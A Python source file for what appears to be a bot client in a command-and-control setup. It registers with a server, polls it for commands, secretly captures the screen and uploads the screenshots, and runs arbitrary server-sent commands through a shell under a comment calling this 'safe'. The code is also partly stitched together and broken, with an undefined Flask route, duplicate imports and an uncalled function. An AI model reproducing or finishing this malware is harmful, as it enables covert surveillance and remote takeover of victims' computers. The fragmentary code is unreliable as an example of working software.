import requests
import time
import os
import subprocess
from dotenv import load_dotenv
import mss
import mss.tools
import requests
import json

# Load environment variables
load_dotenv()

def check_in(server_url):
    for attempt in range(5):  # Try to connect up to 5 times
        try:
            response = requests.get(server_url + '/initialize/sequence/0')
            if response.status_code == 200:
                print("Check-in successful")
                return True
            else:
                print("Failed to check in, response code:", response.status_code)
        except requests.RequestException as e:
            print("Failed to connect:", e)
        time.sleep(5)  # Wait 5 seconds before retrying
    return False

def receive_commands(server_url):
    while True:
        response = requests.get(f"{server_url}/get_commands/bot_id")
        if response.status_code == 200:
            commands = response.json()
            for command in commands:
                if command['type'] == 'screenshot':
                    filepath = take_screenshot()
                    send_screenshot(server_url, filepath)
        time.sleep(10)


def take_screenshot():
    with mss.mss() as sct:
        # The screen part to capture
        monitor = sct.monitors[1]  # Captures the first monitor
        output = 'screen_capture.png'  # Path to store the screenshot file

        # Grab the data
        sct_img = sct.shot(mon=monitor, output=output)

        print(f"Screenshot saved to {output}")
        return output

def send_screenshot(server_url, filepath):
    with open(filepath, 'rb') as f:
        files = {'file': (filepath, f)}
        response = requests.post(f"{server_url}/upload_screenshot", files=files)
        print("Screenshot sent to server:", response.status_code)


def execute_command(command_data):
    command = command_data.get('command')
    if command:
        print(f"Executing: {command}")
        # Example safe command execution
        try:
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, text=True)
            print("Command output:", result.stdout)
        except subprocess.CalledProcessError as e:
            print("Failed to execute command:", e)

@app.route('/send_command', methods=['POST'])
def handle_command():
    data = request.json
    # Process the command here, for example:
    print(f"Received command: {data}")
    # Implement action based on received command
    return jsonify({"message": "Command received", "your_data": data}), 200

import requests

def register_bot(server_url, bot_id):
    response = requests.post(f"{server_url}/register", json={"id": bot_id})
    if response.status_code == 200:
        print("Registration successful")
    else:
        print("Registration failed", response.json())

if __name__ == "__main__":
    server_url = "http://127.0.0.1:5000"
    bot_id = "bot1"
    register_bot(server_url, bot_id)

server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8080')  # Use environment variable for server URL
if check_in(server_url):
    receive_commands(server_url)
